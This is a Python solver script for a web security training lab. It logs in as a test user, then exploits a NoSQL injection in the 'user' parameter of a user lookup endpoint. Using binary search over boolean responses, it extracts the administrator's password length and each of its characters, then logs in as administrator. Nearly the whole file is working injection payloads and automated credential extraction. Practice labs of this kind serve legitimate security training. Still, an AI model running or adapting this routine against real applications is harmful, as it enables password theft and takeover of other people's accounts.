import requests
from rich.console import Console
import re
import utils
import string
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.console = Console()
        self.password_length = None
        self.password = ''

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('name="csrf" value="(.*)"', response.text).group(1)

    def sign_in_as_wiener(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'wiener',
            'password': 'peter'
        }
        self.session.post(self.lab_url + 'login', data=data)

    @staticmethod
    def binary_search(arr, low, high, custom_function, **kwargs):
        while low <= high:
            mid = low + (high - low) // 2

            if custom_function('==', arr[mid], **kwargs):
                return mid

            elif custom_function('>', arr[mid], **kwargs):
                low = mid + 1

            else:
                high = mid - 1

        return -1

    def check_length(self, operator, length):
        data = {
            'user': 'administrator\' && this.password.length {} {} || \'a\'==\'b'.format(operator, length)
        }
        response = self.session.get(self.lab_url + 'user/lookup', params=data)
        if 'Could not find user' in response.text:
            utils.cprint(self, 'Password length {} {}'.format(operator, length), 'failure')
            return False
        else:
            if operator != '==':
                utils.cprint(self, 'Password length {} {}'.format(operator, length), 'info')
            else:
                utils.cprint(self, 'Password length = {}'.format(length), 'success')
            return True

    def calc_password_length(self):
        utils.cprint(self, 'Exfiltrating password length...', 'ack')
        self.password_length = self.binary_search(list(range(1, 21)), 0, 19, self.check_length) + 1

    def check_password(self, operator, character, index):
        data = {
            'user': 'administrator\' && this.password[{}] {} \'{}\' || \'a\'==\'b'.format(index, operator, character)
        }
        response = self.session.get(self.lab_url + 'user/lookup', params=data)
        if 'Could not find user' in response.text:
            utils.cprint(self, 'Password at position {} {} {}'.format(index, operator, character), 'failure')
            return False
        else:
            if operator != '==':
                utils.cprint(self, 'Password at position {} {} {}'.format(index+1, operator, character), 'info')
            else:
                utils.cprint(self, 'Password at position {} = {}'.format(index+1, character), 'success')
            return True

    def extract_password(self):
        lowercase_alphanumeric = list(string.digits + string.ascii_lowercase)

        utils.cprint(self, 'Exfiltrating password...', 'ack')
        for i in range(self.password_length):
            index = self.binary_search(lowercase_alphanumeric, 0, len(lowercase_alphanumeric)-1, self.check_password, index=i)
            self.password += lowercase_alphanumeric[index]

        utils.cprint(self, 'Password is {}.'.format(self.password), 'success')

    def sign_in_as_administrator(self):
        data = {
            'csrf': self.get_csrf_token('login'),
            'username': 'administrator',
            'password': self.password
        }
        self.session.post(self.lab_url + 'login', data=data)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_in_as_wiener()
        self.calc_password_length()
        self.extract_password()
        self.sign_in_as_administrator()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
